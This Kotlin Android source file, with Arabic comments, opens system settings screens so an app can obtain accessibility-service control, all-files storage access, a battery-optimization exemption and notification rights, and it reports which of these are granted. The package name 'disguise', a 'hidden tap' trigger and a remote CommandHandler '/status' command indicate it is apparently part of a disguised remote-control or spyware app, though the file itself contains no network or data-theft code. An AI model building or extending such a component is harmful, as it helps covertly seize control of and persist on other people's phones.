package com.example.disguise.util

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.util.Log

/**
 * PermissionHelper — يفتح شاشات الإعدادات اللازمة لتفعيل الأذونات.
 *
 * الأذونات التي لا يمكن منحها برمجياً على Android 11+ (يجب تدخل المستخدم):
 * 1. AccessibilityService (خدمة إمكانية الوصول) — لا يمكن تفعيلها إلا يدوياً.
 * 2. MANAGE_EXTERNAL_STORAGE (الوصول لجميع الملفات) — لا يمكن منحها إلا يدوياً.
 * 3. POST_NOTIFICATIONS (Android 13+) — يمكن طلبها عبر requestPermissions
 *    لكن الأفضل توجيه المستخدم.
 * 4. Battery Optimization (تحسين البطارية) — يجب إيقافها لضمان بقاء الخدمة.
 *
 * هذا الملف يوفر دوال لفتح الشاشات المناسبة. لا يمنح الأذونات بنفسه.
 *
 * الاستخدام من MainActivity (عبر نقر مخفي) أو من CommandHandler:
 *   PermissionHelper.openAccessibilitySettings(context)
 *   PermissionHelper.openAllFilesSettings(context)
 *   PermissionHelper.openBatteryOptimization(context)
 *   PermissionHelper.requestNotificationPermission(activity)
 */
object PermissionHelper {

    private const val TAG = "PermissionHelper"

    // ============================================================
    // 1. خدمة إمكانية الوصول (AccessibilityService)
    // ============================================================

    /**
     * فتح شاشة إعدادات إمكانية الوصول.
     * المستخدم يرى قائمة الخدمات، يبحث عن اسم التطبيق، ويفعّلها.
     *
     * ملاحظة: لا يمكن تفعيل الخدمة برمجياً — هذا قيد أمني في Android
     * يمنع التطبيقات من منح نفسها هذه الصلاحية الخطيرة.
     */
    fun openAccessibilitySettings(context: Context): Boolean {
        return try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            Log.d(TAG, "opened accessibility settings")
            true
        } catch (e: Exception) {
            Log.e(TAG, "failed to open accessibility settings: ${e.message}", e)
            false
        }
    }

    /**
     * هل خدمة إمكانية الوصول مفعّلة حالياً؟
     * نتحقق من Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES.
     */
    fun isAccessibilityEnabled(context: Context): Boolean {
        val expected = ComponentName(
            context.packageName,
            "com.example.disguise.control.AccessibilityHelper"
        ).flattenToString()

        val enabled = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        return enabled.split(':').any { it.equals(expected, ignoreCase = true) }
    }

    // ============================================================
    // 2. الوصول لجميع الملفات (MANAGE_EXTERNAL_STORAGE)
    // ============================================================

    /**
     * فتح شاشة "الوصول لجميع الملفات" الخاصة بالتطبيق.
     * متاح من Android 11+.
     *
     * المستخدم يرى شاشة بها مفتاح "السماح بإدارة جميع الملفات".
     * يفعّله يدوياً.
     */
    fun openAllFilesSettings(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.w(TAG, "MANAGE_EXTERNAL_STORAGE requires API 30+")
            return false
        }
        return try {
            val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            Log.d(TAG, "opened all-files settings")
            true
        } catch (e: Exception) {
            Log.e(TAG, "failed to open all-files settings: ${e.message}", e)
            // fallback: الشاشة العامة لكل التطبيقات
            return try {
                val fallback = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(fallback)
                true
            } catch (e2: Exception) {
                Log.e(TAG, "fallback failed too: ${e2.message}", e2)
                false
            }
        }
    }

    /**
     * هل يملك التطبيق MANAGE_EXTERNAL_STORAGE؟
     */
    fun hasAllFilesAccess(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            android.os.Environment.isExternalStorageManager()
        } else {
            true
        }
    }

    // ============================================================
    // 3. تحسين البطارية (Battery Optimization)
    // ============================================================

    /**
     * فتح شاشة إعدادات تحسين البطارية (إذا كانت متاحة).
     * إيقاف التحسين يمنع النظام من قتل الخدمة في الخلفية.
     */
    fun openBatteryOptimizationSettings(context: Context): Boolean {
        return try {
            val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            Log.d(TAG, "opened battery optimization settings")
            true
        } catch (e: Exception) {
            Log.e(TAG, "failed to open battery settings: ${e.message}", e)
            false
        }
    }

    /**
     * طلب إعفاء من تحسين البطارية مباشرة (Android 6+).
     * يفتح نافذة نظام تطلب من المستخدم السماح.
     * يتطلب إذن REQUEST_IGNORE_BATTERY_OPTIMIZATIONS في Manifest
     * (لم نضفه، لذا قد لا يعمل على بعض الأجهزة).
     *
     * بديل: openBatteryOptimizationSettings (أعلاه).
     */
    fun requestIgnoreBatteryOptimization(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return false
        return try {
            val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
            val packageName = context.packageName
            if (pm.isIgnoringBatteryOptimizations(packageName)) {
                Log.d(TAG, "already ignoring battery optimizations")
                return true
            }
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = Uri.parse("package:$packageName")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            Log.d(TAG, "requested ignore battery optimization")
            true
        } catch (e: Exception) {
            Log.e(TAG, "battery optimization request failed: ${e.message}", e)
            false
        }
    }

    /**
     * هل التطبيق معفى من تحسين البطارية؟
     */
    fun isIgnoringBatteryOptimizations(context: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true
        val pm = context.getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(context.packageName)
    }

    // ============================================================
    // 4. الإشعارات (POST_NOTIFICATIONS - Android 13+)
    // ============================================================

    /**
     * فتح شاشة إعدادات الإشعارات للتطبيق.
     * على Android 13+، يحتاج المستخدم لتفعيلها يدوياً إذا لم تُطلب عبر
     * requestPermissions من MainActivity.
     */
    fun openNotificationSettings(context: Context): Boolean {
        return try {
            val intent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS).apply {
                    putExtra(Settings.EXTRA_APP_PACKAGE, context.packageName)
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
            } else {
                Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                    data = Uri.parse("package:${context.packageName}")
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
            }
            context.startActivity(intent)
            Log.d(TAG, "opened notification settings")
            true
        } catch (e: Exception) {
            Log.e(TAG, "failed to open notification settings: ${e.message}", e)
            false
        }
    }

    // ============================================================
    // 5. شاشة تفاصيل التطبيق (احتياطي عام)
    // ============================================================

    /**
     * فتح شاشة تفاصيل التطبيق (تحتوي على كل الأذونات).
     * مفيد كخيار احتياطي إذا فشلت الشاشات المحددة.
     */
    fun openAppDetailsSettings(context: Context): Boolean {
        return try {
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = Uri.parse("package:${context.packageName}")
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            Log.d(TAG, "opened app details")
            true
        } catch (e: Exception) {
            Log.e(TAG, "failed to open app details: ${e.message}", e)
            false
        }
    }

    // ============================================================
    // 6. ملخص حالة كل الأذونات (للتشخيص)
    // ============================================================

    /**
     * يعيد نصاً بملخص حالة الأذونات.
     * مفيد كأمر /status في CommandHandler (اختياري).
     */
    fun statusReport(context: Context): String {
        return buildString {
            append("📋 حالة الأذونات:\n")
            append("───────────────────────────\n")
            append("🔓 Accessibility: ")
                .append(if (isAccessibilityEnabled(context)) "✅ مفعّلة" else "❌ غير مفعّلة")
                .append("\n")
            append("📁 All Files: ")
                .append(if (hasAllFilesAccess()) "✅ مفعّل" else "❌ غير مفعّل")
                .append("\n")
            append("🔋 Battery Ignore: ")
                .append(if (isIgnoringBatteryOptimizations(context)) "✅" else "❌")
                .append("\n")
            append("🔔 Notifications: ")
                .append(
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        // لا نتحقق مباشرة بدون ContextCompat، نتركها للمستخدم
                        "افتح الإعدادات للتأكد"
                    } else {
                        "✅ (لا يتطلب إذناً)"
                    }
                )
                .append("\n")
        }
    }
}